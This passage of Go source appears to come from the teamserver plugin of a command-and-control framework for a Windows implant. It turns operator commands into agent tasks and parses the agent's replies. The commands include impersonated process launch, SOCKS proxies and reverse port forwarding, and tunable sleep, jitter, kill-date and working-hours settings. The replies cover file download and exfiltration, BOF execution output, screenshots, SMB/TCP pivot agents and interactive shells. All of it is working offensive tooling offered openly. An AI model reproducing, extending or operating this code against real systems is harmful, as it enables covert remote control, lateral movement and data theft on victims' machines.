				if err != nil {
					err = errors.New("Invalid date format, use: 'DD.MM.YYYY hh:mm:ss'")
					goto RET
				}
				killDate = int(t.Unix())
			}
			array = []interface{}{COMMAND_PROFILE, 3, killDate}

		} else if subcommand == "workingtime" {
			var t string
			t, err = adaptix.GetStringArg(args, "time")
			if err != nil {
				goto RET
			}

			workingTime := 0
			if t != "0" {
				workingTime, err = parseStringToWorkingTime(t)
				if err != nil {
					goto RET
				}
			}
			array = []interface{}{COMMAND_PROFILE, 4, workingTime}

		} else {
			err = errors.New("subcommand for 'profile' not found")
			goto RET
		}

	case "ps":
		if subcommand == "list" {
			array = []interface{}{COMMAND_PS_LIST}

		} else if subcommand == "kill" {
			var pid float64
			pid, err = adaptix.GetFloatArg(args, "pid")
			if err != nil {
				goto RET
			}
			array = []interface{}{COMMAND_PS_KILL, int(pid)}

		} else if subcommand == "run" {
			taskData.Type = adaptix.TASK_TYPE_JOB

			output := adaptix.GetBoolArg(args, "-o")
			impersonation := adaptix.GetBoolArg(args, "-i")
			suspend := adaptix.GetBoolArg(args, "-s")
			programState := 0
			if suspend {
				programState = 4
			}
			programArgs, _ := args["args"].(string)
			programArgs = Ts.TsConvertUTF8toCp(programArgs, agentData.ACP)

			array = []interface{}{COMMAND_PS_RUN, output, impersonation, programState, programArgs}

		} else {
			err = errors.New("subcommand must be 'list', 'kill' or 'run'")
			goto RET
		}

	case "pwd":
		array = []interface{}{COMMAND_PWD}

	case "rev2self":
		array = []interface{}{COMMAND_REV2SELF}

	case "rm":
		var path string
		path, err = adaptix.GetStringArg(args, "path")
		if err != nil {
			goto RET
		}
		array = []interface{}{COMMAND_RM, Ts.TsConvertUTF8toCp(path, agentData.ACP)}

	case "rportfwd":
		taskData.Type = adaptix.TASK_TYPE_TUNNEL

		lportNumber, _ := adaptix.GetFloatArg(args, "lport")
		lport := int(lportNumber)
		if lport < 1 || lport > 65535 {
			err = errors.New("port must be from 1 to 65535")
			goto RET
		}

		if subcommand == "start" {
			var fhost string
			fhost, err = adaptix.GetStringArg(args, "fwdhost")
			if err != nil {
				goto RET
			}
			fportNumber, _ := adaptix.GetFloatArg(args, "fwdport")
			fport := int(fportNumber)
			if fport < 1 || fport > 65535 {
				err = errors.New("port must be from 1 to 65535")
				goto RET
			}

			var tunnelId int64
			tunnelId, err = Ts.TsTunnelCreateRportfwd(agentData.Id, "", lport, fhost, fport)
			if err != nil {
				goto RET
			}
			taskData.TaskId, err = Ts.TsTunnelStart(tunnelId)
			if err != nil {
				goto RET
			}

			messageData.Message = fmt.Sprintf("Starting reverse port forwarding %d to %s:%d", lport, fhost, fport)
			messageData.Status = adaptix.MESSAGE_INFO

		} else if subcommand == "stop" {
			taskData.Completed = true

			Ts.TsTunnelStopRportfwd(agentData.Id, lport)

			taskData.MessageType = adaptix.MESSAGE_SUCCESS
			taskData.Message = "Reverse port forwarding has been stopped"

		} else {
			err = errors.New("subcommand must be 'start' or 'stop'")
			goto RET
		}

	case "sleep":
		var sleepTime int
		var sleepInt int
		sleep, err := adaptix.GetStringArg(args, "sleep")
		if err != nil {
			goto RET
		}
		jitter, _ := adaptix.GetFloatArg(args, "jitter")
		jitterTime := int(jitter)

		sleepInt, err = strconv.Atoi(sleep)
		if err == nil {
			sleepTime = sleepInt
		} else {
			var t time.Duration
			t, err = time.ParseDuration(sleep)
			if err == nil {
				sleepTime = int(t.Seconds())
			} else {
				err = errors.New("sleep must be in '%h%m%s' format or number of seconds")
				goto RET
			}
		}
		if jitterTime < 0 || jitterTime > 100 {
			err = errors.New("jitter must be from 0 to 100")
			goto RET
		}
		if jitterTime > 0 {
			messageData.Message = fmt.Sprintf("Task: sleep to %v with %v%% jitter", sleep, jitterTime)
		} else {
			messageData.Message = fmt.Sprintf("Task: sleep to %v", sleep)
		}

		array = []interface{}{COMMAND_PROFILE, 1, sleepTime, jitterTime}

	case "burst":
		if subcommand == "show" {
			array = []interface{}{COMMAND_PROFILE, 6}
			messageData.Message = "Task: show burst config"

		} else if subcommand == "set" {
			var enabled float64
			var sleepVal float64
			var jitterVal float64
			enabled, err = adaptix.GetFloatArg(args, "enabled")
			if err != nil {
				err = errors.New("parameter 'enabled' must be set (1=on, 0=off)")
				goto RET
			}
			burstEnabled := int(enabled)
			if burstEnabled != 0 && burstEnabled != 1 {
				err = errors.New("parameter 'enabled' must be 0 or 1")
				goto RET
			}

			burstSleep := 50
			sleepVal, err = adaptix.GetFloatArg(args, "sleep")
			if err == nil {
				burstSleep = int(sleepVal)
				if burstSleep < 0 || burstSleep > 10000 {
					err = errors.New("burst sleep must be from 0 to 10000 ms")
					goto RET
				}
			}

			burstJitter := 0
			jitterVal, err = adaptix.GetFloatArg(args, "jitter")
			if err == nil {
				burstJitter = int(jitterVal)
				if burstJitter < 0 || burstJitter > 90 {
					err = errors.New("burst jitter must be from 0 to 90%%")
					goto RET
				}
			}

			messageData.Message = fmt.Sprintf("Task: set burst config - %s", formatBurstStatus(burstEnabled, burstSleep, burstJitter))
			array = []interface{}{COMMAND_PROFILE, 5, burstEnabled, burstSleep, burstJitter}

		} else {
			err = errors.New("subcommand for 'burst' must be 'show' or 'set'")
			goto RET
		}

	case "socks":
		var portNumber float64

		taskData.Type = adaptix.TASK_TYPE_TUNNEL

		portNumber, err = adaptix.GetFloatArg(args, "port")
		port := int(portNumber)
		if port < 1 || port > 65535 || err != nil {
			err = errors.New("port must be from 1 to 65535")
			goto RET
		}

		if subcommand == "start" {
			var address string
			var tunnelId int64
			address, err = adaptix.GetStringArg(args, "address")
			if err != nil {
				goto RET
			}

			version4 := adaptix.GetBoolArg(args, "-socks4")
			if version4 {
				tunnelId, err = Ts.TsTunnelCreateSocks4(agentData.Id, "", address, port)
				if err != nil {
					goto RET
				}
				taskData.TaskId, err = Ts.TsTunnelStart(tunnelId)
				if err != nil {
					goto RET
				}
				taskData.Message = fmt.Sprintf("Socks4 server running on port %d", port)

			} else {
				auth := adaptix.GetBoolArg(args, "-auth")
				if auth {
					var username string
					var password string
					username, err = adaptix.GetStringArg(args, "username")
					if err != nil {
						goto RET
					}
					password, err = adaptix.GetStringArg(args, "password")
					if err != nil {
						goto RET
					}
					tunnelId, err = Ts.TsTunnelCreateSocks5(agentData.Id, "", address, port, true, username, password)
					if err != nil {
						goto RET
					}
					taskData.TaskId, err = Ts.TsTunnelStart(tunnelId)
					if err != nil {
						goto RET
					}

					taskData.Message = fmt.Sprintf("Socks5 (with Auth) server running on port %d", port)

				} else {
					tunnelId, err = Ts.TsTunnelCreateSocks5(agentData.Id, "", address, port, false, "", "")
					if err != nil {
						goto RET
					}
					taskData.TaskId, err = Ts.TsTunnelStart(tunnelId)
					if err != nil {
						goto RET
					}

					taskData.Message = fmt.Sprintf("Socks5 server running on port %d", port)
				}
			}
			taskData.MessageType = adaptix.MESSAGE_SUCCESS
			taskData.ClearText = "\n"

		} else if subcommand == "stop" {
			taskData.Completed = true

			Ts.TsTunnelStopSocks(agentData.Id, port)

			taskData.MessageType = adaptix.MESSAGE_SUCCESS
			taskData.Message = "Socks5 server has been stopped"
			taskData.ClearText = "\n"

		} else {
			err = errors.New("subcommand must be 'start' or 'stop'")
			goto RET
		}

	case "terminate":
		if subcommand == "thread" {
			array = []interface{}{COMMAND_TERMINATE, 1}
		} else if subcommand == "process" {
			array = []interface{}{COMMAND_TERMINATE, 2}
		} else {
			err = errors.New("subcommand must be 'thread' or 'process'")
			goto RET
		}

	case "unlink":
		var pivotName string
		pivotName, err = adaptix.GetStringArg(args, "id")
		if err != nil {
			goto RET
		}

		pivotId, err := resolveBeaconPivot(pivotName)
		if err != nil {
			goto RET
		}
		id, _ := strconv.ParseInt(pivotId, 16, 64)

		array = []interface{}{COMMAND_UNLINK, int(id)}

	case "upload":
		var fileName string
		var localFile string
		var fileContent []byte

		fileName, err = adaptix.GetStringArg(args, "remote_path")
		if err != nil {
			goto RET
		}
		localFile, err = adaptix.GetStringArg(args, "local_file")
		if err != nil {
			goto RET
		}
		fileContent, err = base64.StdEncoding.DecodeString(localFile)
		if err != nil {
			goto RET
		}

		bufferSize := len(fileContent)
		memoryId := int(rand.Uint32())
		fileID := Ts.TsFileGenID()

		err = Ts.TsUploadAddContent(agentData.Id, fileID, fileName, fileContent, true, adaptix.TRANSFER_KIND_FILE, "", "")
		if err != nil {
			goto RET
		}

		acp := agentData.ACP
		sentBytes := 0
		const memChunkSize = 0x100000 

		taskData.OnDispatch = func(ts any, t *adaptix.TaskData) {
			tsi := ts.(adaptix.Teamserver)

			chunk, gerr := tsi.TsUploadGetChunk(fileID, memChunkSize, false)
			if gerr != nil {
				_ = tsi.TsUploadClose(fileID, adaptix.TRANSFER_STATE_CANCELED)
				t.MessageType = adaptix.MESSAGE_ERROR
				t.Message = fmt.Sprintf("Upload #%d canceled", fileID)
				t.Completed = true
				return
			}
			if chunk == nil {
				_ = tsi.TsUploadClose(fileID, adaptix.TRANSFER_STATE_FINISHED)
				t.MessageType = adaptix.MESSAGE_SUCCESS
				t.Message = fmt.Sprintf("Upload #%d finished", fileID)
				t.Completed = true
				return
			}

			memoryArr := []interface{}{COMMAND_SAVEMEMORY, memoryId, bufferSize, len(chunk), chunk}
			data, _ := PackArray(memoryArr)
			t.Data = data

			sentBytes += len(chunk)

			if sentBytes >= bufferSize {
				uploadArr := []interface{}{COMMAND_UPLOAD, memoryId, tsi.TsConvertUTF8toCp(fileName, acp)}
				uploadData, _ := PackArray(uploadArr)
				tsi.TsTaskCreate(agentData.Id, "", "", adaptix.TaskData{
					Type:     adaptix.TASK_TYPE_TASK,
					AgentId:  agentData.Id,
					TaskId:   int64(rand.Uint32()),
					Data:     uploadData,
					Priority: PRIORITY_TASK,
					Sync:     false,
				})
				_ = tsi.TsUploadClose(fileID, adaptix.TRANSFER_STATE_FINISHED)
				t.MessageType = adaptix.MESSAGE_SUCCESS
				t.Message = fmt.Sprintf("Upload #%d finished", fileID)
				t.Completed = true
			}
		}

		taskData.Repeat = true
		messageData.Status = adaptix.MESSAGE_INFO
		messageData.Message = fmt.Sprintf("Uploading %d bytes to %s", bufferSize, fileName)

	default:
		err = errors.New(fmt.Sprintf("Command '%v' not found", command))
		goto RET
	}

	taskData.Data, err = PackArray(array)
	taskData.Priority = PRIORITY_TASK

	/// END CODE

RET:
	return taskData, messageData, err
}

func ProcessData(agentData adaptix.AgentData, decryptedData []byte) error {
	var outTasks []adaptix.TaskData

	taskData := adaptix.TaskData{
		Type:        adaptix.TASK_TYPE_TASK,
		AgentId:     agentData.Id,
		FinishDate:  time.Now().Unix(),
		MessageType: adaptix.MESSAGE_SUCCESS,
		Completed:   true,
		Sync:        true,
	}

	/// START CODE

	decompressed, _ := decompressZlibData(decryptedData)

	packer := CreatePacker(decompressed)

	if false == packer.CheckPacker([]string{"int"}) {
		return errors.New("failed to unmarshal message")
	}

	size := packer.ParseInt32()
	if size-4 != packer.Size() {
		return errors.New("failed to unmarshal message")
	}

	bof_output := make(map[int64]bool)

	for packer.Size() >= 8 {

		if false == packer.CheckPacker([]string{"int", "int"}) {
			goto HANDLER
		}

		TaskId := packer.ParseInt32()
		commandId := packer.ParseInt32()
		task := taskData
		task.TaskId = int64(TaskId)

		switch commandId {

		case COMMAND_CAT:
			if false == packer.CheckPacker([]string{"array", "array"}) {
				goto HANDLER
			}
			path := Ts.TsConvertCpToUTF8(packer.ParseString(), agentData.ACP)
			fileContent := packer.ParseBytes()
			task.Message = fmt.Sprintf("'%v' file content:", path)
			task.ClearText = string(fileContent)

		case COMMAND_CD:
			if false == packer.CheckPacker([]string{"array"}) {
				goto HANDLER
			}
			path := Ts.TsConvertCpToUTF8(packer.ParseString(), agentData.ACP)
			task.Message = "Current working directory:"
			task.ClearText = path

		case COMMAND_COPY:
			task.Message = "File copied successfully"

		case COMMAND_DISKS:
			if false == packer.CheckPacker([]string{"byte", "int"}) {
				goto HANDLER
			}
			result := packer.ParseInt8()
			var drives []adaptix.ListingDrivesDataWin

			if result == 0 {
				errorCode := packer.ParseInt32()
				task.Message = fmt.Sprintf("Error [%d]: %s", errorCode, Ts.TsWin32Error(errorCode))
				task.MessageType = adaptix.MESSAGE_ERROR

			} else {
				drivesCount := int(packer.ParseInt32())

				for i := 0; i < drivesCount; i++ {
					if false == packer.CheckPacker([]string{"byte", "int"}) {
						goto HANDLER
					}
					var driveData adaptix.ListingDrivesDataWin
					driveCode := packer.ParseInt8()
					driveType := packer.ParseInt32()

					driveData.Name = fmt.Sprintf("%c:", driveCode)
					if driveType == 2 {
						driveData.Type = "USB"
					} else if driveType == 3 {
						driveData.Type = "Hard Drive"
					} else if driveType == 4 {
						driveData.Type = "Network Drive"
					} else if driveType == 5 {
						driveData.Type = "CD-ROM"
					} else {
						driveData.Type = "Unknown"
					}

					drives = append(drives, driveData)
				}

				OutputText := fmt.Sprintf(" %-5s  %s\n", "Drive", "Type")
				OutputText += fmt.Sprintf(" %-5s  %s", "-----", "-----")
				for _, item := range drives {
					OutputText += fmt.Sprintf("\n %-5s  %s", item.Name, item.Type)
				}
				task.Message = "List of mounted drives:"
				task.ClearText = OutputText
			}

			Ts.TsClientGuiDisksWindows(task, drives)

		case COMMAND_DOWNLOAD:
			if false == packer.CheckPacker([]string{"int", "byte"}) {
				goto HANDLER
			}
			fileId := int64(uint32(packer.ParseInt32()))
			downloadCommand := packer.ParseInt8()
			if downloadCommand == DOWNLOAD_START {
				if false == packer.CheckPacker([]string{"long", "array"}) {
					goto HANDLER
				}
				fileSize := packer.ParseInt64()
				fileName := Ts.TsConvertCpToUTF8(packer.ParseString(), agentData.ACP)
				task.Message = fmt.Sprintf("The download of the '%s' file (%v bytes) has started: [fid %d]", fileName, fileSize, fileId)
				task.Completed = false
				_ = Ts.TsDownloadAdd(agentData.Id, fileId, fileName, int64(fileSize))

			} else if downloadCommand == DOWNLOAD_CONTINUE {
				if false == packer.CheckPacker([]string{"array"}) {
					goto HANDLER
				}
				fileContent := packer.ParseBytes()
				task.Completed = false
				_ = Ts.TsDownloadUpdate(fileId, adaptix.TRANSFER_STATE_RUNNING, fileContent)
				continue

			} else if downloadCommand == DOWNLOAD_FINISH {
				task.Message = fmt.Sprintf("File download complete: [fid %d]", fileId)
				_ = Ts.TsDownloadClose(fileId, adaptix.TRANSFER_STATE_FINISHED)
			}

		case COMMAND_EXFIL:
			if false == packer.CheckPacker([]string{"int", "byte"}) {
				goto HANDLER
			}
			fileId := int64(uint32(packer.ParseInt32()))
			downloadState := packer.ParseInt8()

			if downloadState == adaptix.TRANSFER_STATE_STOPPED {
				task.Message = fmt.Sprintf("Download '%d' successful stopped", fileId)
				_ = Ts.TsDownloadUpdate(fileId, adaptix.TRANSFER_STATE_STOPPED, []byte(""))

			} else if downloadState == adaptix.TRANSFER_STATE_RUNNING {
				task.Message = fmt.Sprintf("Download '%d' successful resumed", fileId)
				_ = Ts.TsDownloadUpdate(fileId, adaptix.TRANSFER_STATE_RUNNING, []byte(""))

			} else if downloadState == adaptix.TRANSFER_STATE_CANCELED {
				task.Message = fmt.Sprintf("Download '%d' successful canceled", fileId)
				_ = Ts.TsDownloadClose(fileId, adaptix.TRANSFER_STATE_CANCELED)
			}

		case COMMAND_EXEC_BOF:
			if false == packer.CheckPacker([]string{"byte"}) {
				goto HANDLER
			}
			state := packer.ParseInt8()
			if state == 1 {
				task.Message = "Async BOF started"
				task.Completed = false
			} else {
				task.Message = "BOF finished"
				task.Completed = true
			}

		case COMMAND_EXEC_BOF_OUT:
			if false == packer.CheckPacker([]string{"int"}) {
				goto HANDLER
			}
			outputType := packer.ParseInt32()

			if outputType == BOF_ERROR_PARSE {
				if false == packer.CheckPacker([]string{"array"}) {
					goto HANDLER
				}
				_ = packer.ParseString()

				task.MessageType = adaptix.MESSAGE_ERROR
				task.Message = "BOF error"
				task.ClearText = "Parse BOF error"

			} else if outputType == BOF_ERROR_MAX_FUNCS {
				if false == packer.CheckPacker([]string{"array"}) {
					goto HANDLER
				}
				_ = packer.ParseString()

				task.MessageType = adaptix.MESSAGE_ERROR
				task.Message = "BOF error"
				task.ClearText = "The number of functions in the BOF file exceeds 512"

			} else if outputType == BOF_ERROR_ENTRY {
				if false == packer.CheckPacker([]string{"array"}) {
					goto HANDLER
				}
				_ = packer.ParseString()

				task.MessageType = adaptix.MESSAGE_ERROR
				task.Message = "BOF error"
				task.ClearText = "Entry function not found"

			} else if outputType == BOF_ERROR_ALLOC {
				if false == packer.CheckPacker([]string{"array"}) {
					goto HANDLER
				}
				_ = packer.ParseString()

				task.MessageType = adaptix.MESSAGE_ERROR
				task.Message = "BOF error"
				task.ClearText = "Error allocation of BOF memory"

			} else if outputType == BOF_ERROR_SYMBOL {
				if false == packer.CheckPacker([]string{"array"}) {
					goto HANDLER
				}
				output := packer.ParseString()

				task.MessageType = adaptix.MESSAGE_ERROR
				task.Message = "BOF error"
				task.ClearText = "Symbol not found: " + output + "\n"

			} else if outputType == CALLBACK_ERROR {
				if false == packer.CheckPacker([]string{"array"}) {
					goto HANDLER
				}
				output := packer.ParseString()

				task.MessageType = adaptix.MESSAGE_ERROR
				task.Message = "BOF output"
				task.ClearText = Ts.TsConvertCpToUTF8(output, agentData.ACP)

			} else if outputType == CALLBACK_OUTPUT_OEM {
				if false == packer.CheckPacker([]string{"array"}) {
					goto HANDLER
				}
				output := packer.ParseString()

				_, ok := bof_output[task.TaskId]
				if ok {
					task.Message = ""
				} else {
					bof_output[task.TaskId] = true
					task.Message = "BOF output"
				}

				task.MessageType = adaptix.MESSAGE_SUCCESS
				task.ClearText = Ts.TsConvertCpToUTF8(output, agentData.OemCP)

			} else if outputType == CALLBACK_OUTPUT_UTF8 {
				if false == packer.CheckPacker([]string{"array"}) {
					goto HANDLER
				}
				output := packer.ParseString()

				_, ok := bof_output[task.TaskId]
				if ok {
					task.Message = ""
				} else {
					bof_output[task.TaskId] = true
					task.Message = "BOF output"
				}

				task.MessageType = adaptix.MESSAGE_SUCCESS
				task.ClearText = output

			} else if outputType == CALLBACK_AX_SCREENSHOT {
				if false == packer.CheckPacker([]string{"array", "array"}) {
					goto HANDLER
				}
				note := packer.ParseString()
				screen := packer.ParseBytes()

				_ = Ts.TsScreenshotAdd(agentData.Id, note, screen)

			} else if outputType == CALLBACK_AX_DOWNLOAD_MEM {
				if false == packer.CheckPacker([]string{"array", "array"}) {
					goto HANDLER
				}
				filename := Ts.TsConvertCpToUTF8(packer.ParseString(), agentData.ACP)
				data := packer.ParseBytes()
				fileId := Ts.TsFileGenID()

				_ = Ts.TsDownloadSave(agentData.Id, fileId, filename, data)

			} else {
				if false == packer.CheckPacker([]string{"array"}) {
					goto HANDLER
				}
				output := packer.ParseString()

				_, ok := bof_output[task.TaskId]
				if ok {
					task.Message = ""
				} else {
					bof_output[task.TaskId] = true
					task.Message = "BOF output"
				}

				task.MessageType = adaptix.MESSAGE_SUCCESS
				task.ClearText = Ts.TsConvertCpToUTF8(output, agentData.ACP) + "\n"
			}

			task.Completed = false

		case COMMAND_GETUID:
			if false == packer.CheckPacker([]string{"byte", "array", "array"}) {
				goto HANDLER
			}

			high := packer.ParseInt8()
			domain := Ts.TsConvertCpToUTF8(packer.ParseString(), agentData.ACP)
			username := Ts.TsConvertCpToUTF8(packer.ParseString(), agentData.ACP)
			message := ""

			if username != "" {
				if domain != "" {
					username = domain + "\\" + username
				}
				message = fmt.Sprintf("You are '%v'", username)
				if high > 0 {
					message += " (elevated)"
				}
			}
			task.Message = message

		case COMMAND_JOB:
			if false == packer.CheckPacker([]string{"byte", "byte"}) {
				goto HANDLER
			}

			jobType := packer.ParseInt8()
			state := packer.ParseInt8()

			if jobType == JOB_TYPE_SHELL {
				tunnelId := task.TaskId

				if state == JOB_STATE_STARTING {
					Ts.TsTerminalConnResume(agentData.Id, tunnelId, false)

				} else if state == JOB_STATE_RUNNING {
					if false == packer.CheckPacker([]string{"array"}) {
						goto HANDLER
					}
					data := Ts.TsConvertCpToUTF8(packer.ParseString(), agentData.OemCP)
					Ts.TsTerminalConnData(tunnelId, []byte(data))

				} else if state == JOB_STATE_KILLED {
					_ = Ts.TsTerminalConnClose(tunnelId, "Terminal stopped")

				} else if state == JOB_STATE_FINISHED {
					if false == packer.CheckPacker([]string{"int"}) {
						goto HANDLER
					}
					errorCode := packer.ParseInt32()
					status := fmt.Sprintf("Error [%d]: %s", errorCode, Ts.TsWin32Error(errorCode))
					_ = Ts.TsTerminalConnClose(tunnelId, status)
				}

			} else {
				if state == JOB_STATE_RUNNING {
					if false == packer.CheckPacker([]string{"array"}) {
						goto HANDLER
					}
					task.Completed = false
					jobOutput := Ts.TsConvertCpToUTF8(packer.ParseString(), agentData.OemCP)
					task.Message = fmt.Sprintf("Job [%v] output:", task.TaskId)
					task.ClearText = jobOutput
				} else if state == JOB_STATE_KILLED {
					task.Completed = true
					task.MessageType = adaptix.MESSAGE_INFO
					task.Message = fmt.Sprintf("Job [%v] canceled", task.TaskId)
				} else if state == JOB_STATE_FINISHED {
					task.Completed = true
					task.Message = fmt.Sprintf("Job [%v] finished", task.TaskId)
				}
			}

		case COMMAND_JOB_LIST:
			var Output string
			if false == packer.CheckPacker([]string{"int"}) {
				goto HANDLER
			}
			count := packer.ParseInt32()

			if count > 0 {
				Output += fmt.Sprintf(" %-10s  %-5s  %-13s\n", "JobID", "PID", "Type")
				Output += fmt.Sprintf(" %-10s  %-5s  %-13s", "--------", "-----", "-------")
				for i := 0; i < int(count); i++ {
					if false == packer.CheckPacker([]string{"int", "word", "word"}) {
						goto HANDLER
					}
					jobId := fmt.Sprintf("%08x", packer.ParseInt32())
					jobType := packer.ParseInt16()
					pid := packer.ParseInt16()

					stringType := "Unknown"
					if jobType == 0x1 {
						stringType = "Local"
					} else if jobType == 0x2 {
						stringType = "Remote"
					} else if jobType == 0x3 {
						stringType = "Process"
					} else if jobType == 0x4 {
						stringType = "Shell"
					} else if jobType == 0x5 {
						stringType = "Async BOF"
					}
					Output += fmt.Sprintf("\n %-10v  %-5v  %-13s", jobId, pid, stringType)
				}
				task.Message = "Job list:"
				task.ClearText = Output
			} else {
				task.Message = "No active jobs"
			}

		case COMMAND_JOBS_KILL:
			if false == packer.CheckPacker([]string{"byte", "int"}) {
				goto HANDLER
			}
			result := packer.ParseInt8()
			jobId := packer.ParseInt32()

			if result == 0 {
				task.MessageType = adaptix.MESSAGE_ERROR
				task.Message = fmt.Sprintf("Job %v not found", jobId)
			} else {
				task.Message = fmt.Sprintf("Job %v mark as Killed", jobId)
			}

		case COMMAND_LINK:
			if false == packer.CheckPacker([]string{"byte", "int", "array"}) {
				goto HANDLER
			}

			linkType := packer.ParseInt8()
			watermark := fmt.Sprintf("%08x", packer.ParseInt32())
			beat := packer.ParseBytes()

			childAgentId, _ := Ts.TsListenerInteralHandler(watermark, beat)
			_ = Ts.TsPivotCreate(fmt.Sprintf("%08x", task.TaskId), agentData.Id, childAgentId, fmt.Sprintf("%d", childAgentId), false)

			if linkType == 1 {
				task.Message = fmt.Sprintf("----- New SMB pivot agent: [%d]===[%d] -----", agentData.Id, childAgentId)
				Ts.TsAgentConsoleOutput(childAgentId, "", adaptix.MESSAGE_SUCCESS, task.Message, "\n", true)
			} else if linkType == 2 {
				task.Message = fmt.Sprintf("----- New TCP pivot agent: [%d]===[%d] -----", agentData.Id, childAgentId)
				Ts.TsAgentConsoleOutput(childAgentId, "", adaptix.MESSAGE_SUCCESS, task.Message, "\n", true)
			}

		case COMMAND_LS:
			if false == packer.CheckPacker([]string{"byte"}) {
				goto HANDLER
			}
			result := packer.ParseInt8()

			var items []adaptix.ListingFileDataWin
			var rootPath string

			if result == 0 {
				if false == packer.CheckPacker([]string{"int"}) {
					goto HANDLER
				}
				errorCode := packer.ParseInt32()
				task.Message = fmt.Sprintf("Error [%d]: %s", errorCode, Ts.TsWin32Error(errorCode))
				task.MessageType = adaptix.MESSAGE_ERROR

			} else {
				if false == packer.CheckPacker([]string{"array", "int"}) {
					goto HANDLER
				}
				rootPath = Ts.TsConvertCpToUTF8(packer.ParseString(), agentData.ACP)
				rootPath, _ = strings.CutSuffix(rootPath, "\\*")

				filesCount := int(packer.ParseInt32())

				if filesCount == 0 {
					task.Message = fmt.Sprintf("The '%s' directory is EMPTY", rootPath)
				} else {

					var folders []adaptix.ListingFileDataWin
					var files []adaptix.ListingFileDataWin

					for i := 0; i < filesCount; i++ {
						if false == packer.CheckPacker([]string{"byte", "long", "int", "array"}) {
							goto HANDLER
						}
						isDir := packer.ParseInt8()
						fileData := adaptix.ListingFileDataWin{
							IsDir:    false,
							Size:     int64(packer.ParseInt64()),
							Date:     int64(packer.ParseInt32()),
							Filename: Ts.TsConvertCpToUTF8(packer.ParseString(), agentData.ACP),
						}
						if isDir > 0 {
							fileData.IsDir = true
							folders = append(folders, fileData)
						} else {
							files = append(files, fileData)
						}
					}

					items = append(folders, files...)

					OutputText := fmt.Sprintf(" %-8s %-14s %-20s  %s\n", "Type", "Size", "Last Modified      ", "Name")
					OutputText += fmt.Sprintf(" %-8s %-14s %-20s  %s", "----", "---------", "----------------   ", "----")

					for _, item := range items {
						t := time.Unix(item.Date, 0).UTC()
						lastWrite := fmt.Sprintf("%02d/%02d/%d %02d:%02d", t.Day(), t.Month(), t.Year(), t.Hour(), t.Minute())

						if item.IsDir {
							OutputText += fmt.Sprintf("\n %-8s %-14s %-20s  %-8v", "dir", "", lastWrite, item.Filename)
						} else {
							OutputText += fmt.Sprintf("\n %-8s %-14s %-20s  %-8v", "", SizeBytesToFormat(item.Size), lastWrite, item.Filename)
						}
					}
					task.Message = fmt.Sprintf("Listing '%s'", rootPath)
					task.ClearText = OutputText
				}
			}
			Ts.TsClientGuiFilesWindows(task, rootPath, items)

		case COMMAND_MKDIR:
			if false == packer.CheckPacker([]string{"array"}) {
				goto HANDLER
			}
			path := Ts.TsConvertCpToUTF8(packer.ParseString(), agentData.ACP)
			task.Message = fmt.Sprintf("Directory '%v' created successfully", path)

		case COMMAND_MV:
			task.Message = "File moved successfully"

		case COMMAND_PIVOT_EXEC:
			if false == packer.CheckPacker([]string{"int", "array"}) {
				goto HANDLER
			}

			pivotId := fmt.Sprintf("%08x", packer.ParseInt32())
			pivotData := packer.ParseBytes()

			_, _, childAgentId := Ts.TsGetPivotInfoById(pivotId)

			_ = Ts.TsAgentProcessData(childAgentId, pivotData)

		case COMMAND_PROFILE:
			if false == packer.CheckPacker([]string{"int"}) {
				goto HANDLER
			}
			subcommand := packer.ParseInt32()

			if subcommand == 1 {
				if false == packer.CheckPacker([]string{"int", "int"}) {
					goto HANDLER
				}
				agentData.Sleep = packer.ParseInt32()
				agentData.Jitter = packer.ParseInt32()

				task.Message = "Sleep time has been changed"

				_ = Ts.TsAgentUpdateData(agentData)

			} else if subcommand == 2 {
				if false == packer.CheckPacker([]string{"int"}) {
					goto HANDLER
				}
				size := packer.ParseInt32()
				task.Message = fmt.Sprintf("Download chunk size set to %v bytes", size)

			} else if subcommand == 3 {
				if false == packer.CheckPacker([]string{"int"}) {
					goto HANDLER
				}
				agentData.KillDate = int(packer.ParseInt32())

				task.Message = "Option 'killdate' is set"
				if agentData.KillDate == 0 {
					task.Message = "The 'killdate' option is disabled"
				}

				_ = Ts.TsAgentUpdateData(agentData)

			} else if subcommand == 4 {
				if false == packer.CheckPacker([]string{"int"}) {
					goto HANDLER
				}
				agentData.WorkingTime = int(packer.ParseInt32())

				task.Message = "Option 'workingtime' is set"
				if agentData.WorkingTime == 0 {
					task.Message = "The 'workingtime' option is disabled"
				}

				_ = Ts.TsAgentUpdateData(agentData)

			} else if subcommand == 5 { // Burst set response
				if false == packer.CheckPacker([]string{"int", "int", "int"}) {
					goto HANDLER
				}
				burstEnabled := packer.ParseInt32()
				burstSleep := packer.ParseInt32()
				burstJitter := packer.ParseInt32()

				task.Message = fmt.Sprintf("Burst config updated: %s", formatBurstStatus(int(burstEnabled), int(burstSleep), int(burstJitter)))

			} else if subcommand == 6 {
				// Burst show response
				if false == packer.CheckPacker([]string{"int", "int", "int"}) {
					goto HANDLER
				}
				burstEnabled := packer.ParseInt32()
				burstSleep := packer.ParseInt32()
				burstJitter := packer.ParseInt32()

				task.Message = fmt.Sprintf("Burst config: %s", formatBurstStatus(int(burstEnabled), int(burstSleep), int(burstJitter)))
			}

		case COMMAND_PS_LIST:
			if false == packer.CheckPacker([]string{"byte", "int"}) {
				goto HANDLER
			}

			result := packer.ParseInt8()

			var proclist []adaptix.ListingProcessDataWin

			if result == 0 {
				errorCode := packer.ParseInt32()
				task.Message = fmt.Sprintf("Error [%d]: %s", errorCode, Ts.TsWin32Error(errorCode))
				task.MessageType = adaptix.MESSAGE_ERROR

			} else {
				processCount := int(packer.ParseInt32())

				if processCount == 0 {
					task.Message = "Failed to get process list"
					task.MessageType = adaptix.MESSAGE_ERROR
					break
				}

				contextMaxSize := 10

				for i := 0; i < processCount; i++ {
					if false == packer.CheckPacker([]string{"word", "word", "word", "byte", "byte", "array", "array", "array"}) {
						goto HANDLER
					}
					procData := adaptix.ListingProcessDataWin{
						Pid:       uint(packer.ParseInt16()),
						Ppid:      uint(packer.ParseInt16()),
						SessionId: uint(packer.ParseInt16()),
						Arch:      "",
					}

					isArch64 := packer.ParseInt8()
					if isArch64 == 0 {
						procData.Arch = "x32"
					} else if isArch64 == 1 {
						procData.Arch = "x64"
					}

					elevated := packer.ParseInt8()
					domain := Ts.TsConvertCpToUTF8(packer.ParseString(), agentData.ACP)
					username := Ts.TsConvertCpToUTF8(packer.ParseString(), agentData.ACP)

					if username != "" {
						procData.Context = username
						if domain != "" {
							procData.Context = domain + "\\" + username
						}
						if elevated > 0 {
							procData.Context += " *"
						}

						if len(procData.Context) > contextMaxSize {
							contextMaxSize = len(procData.Context)
						}
					}

